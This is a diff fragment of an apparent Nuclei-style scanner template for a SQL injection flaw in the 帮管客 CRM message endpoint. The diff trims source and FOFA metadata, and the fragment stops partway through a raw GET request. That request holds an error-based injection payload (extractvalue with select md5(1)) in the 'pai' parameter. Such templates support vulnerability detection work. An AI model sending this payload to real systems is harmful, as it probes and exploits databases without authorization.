@@ -3,14 +3,8 @@ info:
   name: 帮管客CRMmessage存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/483c7b5ef8019850a32243b51abaeb03
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 483c7b5ef8019850a32243b51abaeb03
-    fofa: + fofa`app="帮管客-CRM"`
 http:
 - raw:
   - 'GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5(1)),0x7e))%23&xu=desc HTTP/1.1
